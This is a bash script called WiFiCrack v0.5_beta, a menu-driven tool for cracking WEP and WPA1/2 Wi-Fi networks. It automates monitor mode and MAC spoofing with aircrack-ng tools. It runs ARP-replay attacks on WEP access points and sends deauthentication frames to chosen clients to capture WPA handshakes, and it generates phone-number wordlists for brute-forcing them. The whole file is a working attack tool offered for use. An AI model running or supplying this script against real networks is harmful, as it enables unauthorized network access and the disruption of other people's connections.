#!/bin/bash

function help {
clear
echo "----------------------- WiFiCrack HELP -----------------------

1 --> Sets the selected WLAN interface in monitor mode and begins the cracking process.
2 --> Unsets monitor mode for selected WLAN interface.
h --> Shows this text.
v --> Calls nmcli and displays nearby Access Points.
s --> Shows technical info of the current WLAN interface.
t --> Test injection quality of the current WLAN interface. Without injection support some commands will not be able to run successfully.
q --> Exits the script.
"
}
function resolve_dependencies {
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo ${f:5:${#f}-13}; done;)
    
    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK="aircrack-ng"
    else
        unset AIRCRACK
    fi

    if [[ -z "$NMCLI" ]]; then
        NMCLI="networkmanager"
    else
        unset NMCLI
    fi

    if [[ -z "$MACCHANGER" ]]; then
        MACCHANGER="macchanger"
    else
        unset MACCHANGER
    fi

    if [[ -z "$XTERM" ]]; then
        XTERM="xterm"
    else
        unset XTERM
    fi

    case $DISTRO in
        arch )
            INSTALL="pacman -S --noconfirm "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt-get -y install "
            ;;
        redhat )
            INSTALL="dnf -y install "
            ;;
        LinuxMint )
            INSTALL="apt-get -y install "
            ;;
        debian )
            INSTALL="apt-get -y install "
            ;;
        OpenSUSE )
            INSTALL="zypper -n install "
            ;;
        fedora )
            INSTALL="dnf -y install "
            ;;
        * )
            echo -ne "Unable to determine Linux Distribution! Install "$AIRCRACK" "$NMCLI" "$MACCHANGER" "$XTERM" manually."
            exit 1
    esac

    read -p "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system, install now ?" DYN
    if [[ "$DYN" = y ]]; then
        $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
        resolve_dependencies
    else
        clear
        echo "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system."
        exit 1
    fi
else
    :
fi
}
function gen_wl {
CRUNCH=$(command -v crunch)
if [[ -z "$CRUNCH" ]]; then
    echo
    echo "Crunch is not installed. Install it and try again."
    read -p "Press Enter to go back..." KEY
    unset CRUNCH
    go_back
fi
clear
echo "------- Cell Phone number generator, using crunch. -------"
echo
read -p "Enter Phone Number digit length : " LENGTH
read -p "Enter Cell Phone prefix : " PREFIX
read -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
TMP_1=$(echo ${#PREFIX})
TMP_2=$(expr $LENGTH - $TMP_1 + 1)
TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
TMP_4=$(echo $TMP_3 | sed 's/%/X/g')
SUFFIX=".lst"
if [[ -z "$RECURRING" ]]; then
    crunch $LENGTH $LENGTH -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
else
    crunch $LENGTH $LENGTH -d $RECURRING -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
fi
GEN=$(echo $?)
if [[ "$GEN" -eq 0 ]]; then
    echo "Wordlist successfully generated."
    read -p "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
else
    echo "Something went wrong, check function \"gen_wl\"."
    read -p "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
fi
}
function test_injection {
echo
if [[ -n "$STATE" ]]; then
    echo "Testing injection for $IFACE"
    WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
    if [[ -n "$WORKS" ]]; then
        echo "WLAN interface ($IFACE) supports injection."
        echo
    else
        echo "WLAN interface ($IFACE) does NOT support injection."
        echo
    fi
else
    echo
    echo "Please wait..."
    set_mon >> /dev/null
    FLAG=1
    test_injection
fi
if [[ "$FLAG" -eq 1 ]]; then
    unset_mon >> /dev/null
fi
}
function choose_mode {
echo
echo "Select Cracking Mode : "
SELECT="Select : "
echo
echo "1) WEP"
echo "2) WPA1/2"
echo "b) Go back"
while read -n1 MODE
do
    case $MODE in
        1 )
            MODE=WEP
            if [[ -n $STATE ]] && [[ $IFACENUM -eq 1 ]]; then
                echo
                echo "Please wait ..."
                unset_mon >> /dev/null #Unseting monitor mode before running nmcli.
                sleep 5
            fi
            list_APs
            set_mon
            crack_wep
            break
            ;;
        2 )
            MODE=WPA
            if [[ -n $STATE ]] && [[ $IFACENUM -eq 1 ]]; then
                echo
                echo "Please wait ..."
                unset_mon >> /dev/null #Unseting monitor mode before running nmcli.
                sleep 5
            fi
            list_APs
            set_mon
            crack_wpa
            break
            ;;
        b )
            go_back
            break
            ;;
        * )
            echo -ne "\nInvalid character '$MODE' entered. $SELECT"
    esac
done
}
function list_APs {
readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE)
if [[ -z "$LINES" ]]; then
    echo "No $MODE Networks found."
    echo
    read -p "Press Enter to go back" KEY
    go_back
else
    echo
    echo "Select an AP"
    echo "SSID  CHAN    BSSID   SECURITY    SIGNAL"
    select CHOICE in "${LINES[@]}"; do
        [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    read -r AP <<< "$CHOICE)"
    echo
    echo "You picked ($AP"
    BSSID=$(echo $AP | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
    CHAN=$(echo $AP | awk -F ':' '{print $2}')
    ESSID=$(echo $AP | awk -F ':' '{print $1}')
    echo "AP Name: "$ESSID
    echo "AP Channel: "$CHAN
    echo "AP MAC: "$BSSID
fi
}
function crack_wpa {
clear
echo "------------ WPA1/2 4-Way Handshake method ------------"
read -p "Press Enter to continue ?" KEY
IFACE=$(ls /sys/class/net | grep $IFACE)
ESSID=$(tr -d ' ' <<< $ESSID)
AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
echo "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
You capture a 4-Way Handshake by forcing an already connected client to de-auth, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake."
echo

read -p "Are any clients connected ? [yn]" ANSWER
if [[ "$ANSWER" = y ]]; then
    ASN=y
    while [[ "$ASN" != n ]]; do
        read -p "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
        read -p "How many times ?" TIMES
        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
        read -p "Try again ? [yn] " ASN
    done
fi
echo
echo "You need the $ESSID.cap file in order to feed it to aircrack-ng and brute-force the password. Consider keeping it."
read -p "Press Enter to continue..." KEY
clean_up
echo
read -p "Press Enter to go back" KEY
PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
kill $PID
unset PID
unset ESSID
unset AIRODUMP
unset CHAN
unset BSSID
go_back
}
function clean_up {
echo
read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
read -p "Keep $ESSID.cap file ? [yn] " ANS
if [[ "$ASR" = y && "$ANS" = y ]]; then
    rm -f $ESSID*.netxml
    rm -f $ESSID*.csv
    rm -f replay*.cap
elif [[ "$ASR" = y && "$ANS" = n ]]; then
    rm -f $ESSID*.netxml
    rm -f $ESSID*.cap
    rm -f $ESSID*.csv
    rm -f replay*.cap
elif [[ "$ASR" = n ]]; then
    :
fi
}
function crack_wep {
clear
echo "------------ WEP ARP replay method ------------"
read -p "Press Enter to continue ?" KEY
IFACE=$(ls /sys/class/net | grep $IFACE)
ESSID=$(tr -d ' ' <<< $ESSID)
AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
COUNTER=3
echo
until [[ "$COUNTER" -lt 1 ]]; do
    echo "Attempting to Associate... $COUNTER"
    let COUNTER-=1
    SUCCESS=$(aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE" | grep "Association successful :-) (AID: 1)")
    if [[ -n $SUCCESS ]]; then
        echo "Association successful!"
        echo "Initiating ARP Replay attack..."
        aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
        echo
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ -z "$SUCCESS" ]]; then
    echo "Unable to Associate, make sure your wlan interface supports injection."
    read -p "Test injection now ? [yn]" INJ
    if [[ "$INJ" = y ]]; then
        test_injection
    fi
    echo
    echo "In some cases rebooting your computer usually fixes the Association failure."
    echo
    clean_up
    PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    read -p "Press Enter to go back" KEY
    go_back
fi
echo "Wait for #Data in airodump-ng to reach at least 15K..."
echo
sleep 20
read -p "Try cracking $ESSID now ? [yn] : " ANSWER
if [[ "$ANSWER" = y ]]; then
    readarray -t FILES < <(find `pwd` -name "*.cap")
    if [[ -z "$FILES" ]]; then
        echo "No .cap files found."
        echo
        read -p "Press Enter to go back" KEY
        go_back
    else
        echo "Select a .cap file to crack"
        select CHOICE in "${FILES[@]}"; do
            [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
            break
        done
        read -r CAP <<< "$CHOICE"
    fi
    echo $CAP
    COMMAND="aircrack-ng "$CAP""
    env -u SESSION_MANAGER xterm -hold -e $COMMAND &
    clear
    echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)..."
    clean_up
    echo
    read -p "Press Enter to exit and go back" KEY
    PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    PID=$(ps aux | grep "xterm -hold -e aircrack-ng" | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    go_back
elif [[ "$ANSWER" = n ]]; then
    clean_up
    read -p "Press Enter to exit and go back" KEY
    PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    go_back
fi
}
function show_info {
ADDR=$(iw $IFACE info | grep addr | awk -F ' ' '{print $2}')
TYPE=$(iw $IFACE info | grep \t\y\p\e | awk -F ' ' '{print $2}')
TXPOWER==$(iw $IFACE info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
NAME=$(iw $IFACE info | grep Interface | awk -F ' ' '{print $2}')
CHANNEL=$(iw $IFACE info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
echo "----------------------- WiFi Card Info -----------------------"
echo
echo "Name                          : $NAME"
echo "MAC Addr                      : $ADDR"
echo "Type                          : $TYPE"
echo "Channel                       : $CHANNEL"
echo "Transmit Power                : $TXPOWER"
unset ADDR
unset TYPE
unset TXPOWER
unset NAME
unset CHANNEL
}
function unset_mon {
if [[ -z "$STATE" ]]; then
    echo
    echo "Monitor mode was not set on $IFACE."
    sleep 2
else
    echo
    echo "Disabling Monitor Mode for $IFACE..."
    echo
    echo "Bringing $IFACE down..."
    IFACE=$(ls /sys/class/net | grep $IFACE)
    ifconfig $IFACE down >> /dev/null
    echo "Reverting MAC address to factory default..."
    macchanger -p $IFACE  >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig $IFACE up >> /dev/null
    echo "Disabling monitor mode for $IFACE..."
    airmon-ng stop $IFACE >> /dev/null
    echo "$IFACE is no longer in monitor mode."
    STATE=''
    sleep 2
    IFACE=$(sed 's/mon//g' <<< $IFACE)
fi
}
function set_mon {
if [[ -z "$STATE" ]]; then
    echo
    echo "Setting $IFACE in Monitor Mode..."
    echo
    echo "Creating new interface..."
    airmon-ng start $IFACE >> /dev/null
    IFACE=$(ls /sys/class/net | grep $IFACE)
    echo "Bringing $IFACE down..."
    ifconfig $IFACE down >> /dev/null
    echo "Changing MAC address for $IFACE"
    macchanger -m 00:11:22:33:44:55 $IFACE >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig $IFACE up >> /dev/null
    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    STATE=$(echo $IFACE | grep mon)
    echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
else
    echo
    echo "$IFACE already in monitor mode."
    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    sleep 2
fi
}
function go_back {
    if [[ "$IFACENUM" -eq 1 ]]; then
        single_interface
    else
        multiple_interfaces
    fi
}
function menu {
if [[ "$IFACENUM" -eq 1 ]]; then
    clear
    echo "----------------------- WiFiCrack v0.5_beta -----------------------"
    if [[ -n $STATE ]]; then
        MM=ON
    else
        MM=OFF
    fi
    echo "WLAN Interface : $IFACE"
    echo "Monitor Mode   : $MM" 
    echo
    echo "1) Crack"
    echo "e) Enable <M/M>"
    echo "d) Disable <M/M>"
    echo "w) Generate Wordlists"
    echo "h) View Help"
    echo "v) View APs"
    echo "s) Show Info"
    echo "t) Test Injection"
    echo "q) Abort!"
    echo
    PROMPT="Choose : "
    echo -n "$PROMPT"
else
    clear
    echo "----------------------- WiFiCrack v0.5_beta -----------------------"
    if [[ -n $STATE ]]; then
        MM=ON
    else
        MM=OFF
    fi
    echo "WLAN Interface : $IFACE"
    echo "Monitor Mode   : $MM" 
    echo
    echo "1) Crack"
    echo "e) Enable <M/M>"
    echo "d) Disable <M/M>"
    echo "w) Generate Wordlists"
    echo "h) View Help"
    echo "v) View APs"
    echo "s) Show Info"
    echo "c) Change Interface"
    echo "t) Test Injection"
    echo "q) Abort!"
    echo
    PROMPT="Choose : "
    echo -n "$PROMPT"
fi
}
function list_ifaces {
clear
readarray -t IFACES < <(ls /sys/class/net | grep wl)
echo "Select an interface (WLAN Card)"
select CHOICE in "${IFACES[@]}"; do
    [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
    break
done
read -r IFACE <<< "$CHOICE"
echo "You picked : $IFACE"
}
function single_interface {
STATE=$(ls /sys/class/net | grep mon)
IFACE=$(ls /sys/class/net | grep wl)
MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
menu
while read -n1 CHAR
do
    case $CHAR in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            single_interface
            break
            ;; 
        w )
            gen_wl
            break
            ;;
        d )
            unset_mon
            clear
            single_interface
            break
            ;;
        h )
            echo
            help
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        v )
            if [[ -n "$STATE" ]]; then
                unset_mon >> /dev/null
                echo
                echo "Please wait..."
                sleep 5
            fi
            clear
            nmcli dev wifi list
            echo
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        s )
            clear
            show_info
            echo
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        t )
            clear
            test_injection
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
    esac
done
}
function multiple_interfaces {
STATE=$(echo $IFACE | grep mon)
menu
while read -n1 CHAR
do
    case $CHAR in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            multiple_interfaces
            break
            ;;
        w )
            gen_wl
            break
            ;;
        d )
            unset_mon
            clear
            multiple_interfaces
            break
            ;;
        h )
            echo
            help
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        v )
            clear
            if [[ -n "$STATE" ]]; then
                echo
                echo "Please wait..."
                unset_mon >> /dev/null
                sleep 5
            fi
            clear
            nmcli dev wifi list
            echo
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        s )
            clear
            show_info
            echo
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        t )
            clear
            test_injection
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        c )
            list_ifaces
            multiple_interfaces
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
    esac
done
}
function check_root {
if [[ "$EUID" -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi
}
function check_wlan {
IFACENUM=$(ls /sys/class/net/ | grep wl |  wc -l)
if [[ "$IFACENUM" -gt 1 ]]; then
    echo "You have multiple wlan interfaces."
    list_ifaces
    multiple_interfaces
elif [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan